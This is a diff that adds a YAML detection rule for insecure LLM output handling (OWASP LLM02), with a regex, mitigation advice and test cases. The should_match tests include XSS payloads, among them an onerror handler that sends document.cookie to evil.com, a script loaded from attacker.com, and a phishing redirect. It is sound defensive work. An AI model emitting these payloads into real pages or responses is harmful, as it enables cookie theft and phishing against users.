@@ -1,0 +1,50 @@
+# OWASP LLM Top 10 — LLM02: Insecure Output Handling
+# Threat: Model output containing executable code or script injections is passed unsanitized to downstream systems, enabling XSS, code execution, or data theft.
+
+schema_version: agentshield-rule-v0.1
+rule_id: owasp-llm02-insecure-output
+name: "OWASP LLM02 — Insecure Output Handling"
+description: >
+  Detects model output containing executable code, shell commands, or script
+  injections that could be passed unsanitized to downstream systems. Covers classic
+  XSS vectors (<script>, javascript: URIs, inline event handlers), dynamic code
+  evaluation (eval()), and DOM manipulation sinks (document.write, document.cookie,
+  window.location). Fires on the response content_type before output is forwarded
+  to any consumer.
+severity: HIGH
+category: output-safety
+owasp_llm: LLM02
+tags: [owasp, llm, xss, code-injection, output-sanitization]
+content_types: [response]
+action: block
+
+detector:
+  type: regex
+  pattern: "(?i)(?:<script[^>]*>|javascript:\\s*|on(?:load|click|error|mouseover)\\s*=\\s*[\"']|eval\\s*\\(|document\\.(?:write|cookie|location)|window\\.location\\s*=)"
+
+mitigation: >
+  Strip or encode the offending token before forwarding output to any consumer.
+  For high-confidence matches (script tags, javascript: URIs) block outright and
+  return a sanitized error. Log the full model response, matched span, and the
+  originating prompt for red-team analysis. Consider routing to a secondary output
+  validation layer for HTML contexts.
+
+references:
+  - https://owasp.org/www-project-top-10-for-large-language-model-applications/
+  - https://owasp.org/www-project-top-10-for-large-language-model-applications/descriptions/Insecure_Output_Handling.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+
+test_cases:
+  should_match:
+    - "<script>document.cookie='stolen='+document.cookie</script>"
+    - "Here is your result: <img src=x onerror='fetch(\"https://evil.com/\"+document.cookie)'>"
+    - "javascript:eval(atob('YWxlcnQoMSk='))"
+    - "document.write('<script src=\"https://attacker.com/x.js\"></script>')"
+    - "window.location = 'https://phishing.example.com'"
+  should_not_match:
+    - "Here is a Python example: print('hello world')"
+    - "You can use document.getElementById() to find elements in the DOM."
+    - "The <script> tag is used in HTML to embed JavaScript — always escape user input."
+
+author: ArmyKnifeLabs
+license: MIT
